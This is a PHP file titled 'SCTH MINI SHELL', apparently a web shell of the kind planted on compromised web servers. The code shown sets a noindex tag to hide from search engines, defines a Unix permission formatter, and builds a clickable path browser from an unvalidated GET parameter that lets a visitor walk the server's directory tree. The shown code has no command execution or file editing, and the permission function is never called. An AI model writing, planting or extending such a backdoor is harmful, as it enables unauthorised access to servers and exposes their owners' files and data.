<?php
function perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// Security headers
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}

// Start HTML
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex, nofollow">
    <link rel="shortcut icon" href="https://d.top4top.io/p_339978lyd9.jpg">
    <title>SCTH MINI SHELL</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: black;
            color: red;
        }
        table {
            width: 700px;
            margin: 0 auto;
            border: 1px dotted #000;
            border-collapse: collapse;
        }
        td, th {
            padding: 8px;
            border: 1px solid #000;
            text-align: center;
        }
        a {
            color: white;
            text-decoration: none;
        }
        a:hover {
            color: blue;
            text-shadow: 0 0 10px #fff;
        }
        .blink_text {
            animation: blinker 2s linear infinite;
            color: red;
        }
        @keyframes blinker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
    </style>
</head>
<body>
    <center><h1 class="blink_text" style="color:white; text-shadow: 0 0 20px #00ffff;">SCTH MINI SHELL</h1></center>
    <table>
        <tr><td><strong style="color:white">Path :</strong> <?php
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $path = str_replace('\\','/',$path);
            $paths = explode('/', $path);
            foreach ($paths as $id => $pat) {
                if ($pat === '' && $id === 0) {
                    echo '<a href="?path=/">/</a>';
                    continue;
                }
                if ($pat === '') continue;
                echo '<a href="?path=';
                for ($i = 0; $i <= $id; $i++) {
                    echo "$paths[$i]";
                    if ($i != $id) echo "/";
                }
                echo '">' . $pat . '</a>/';
            }
        ?></td></tr>
    </table>
</body>
</html>
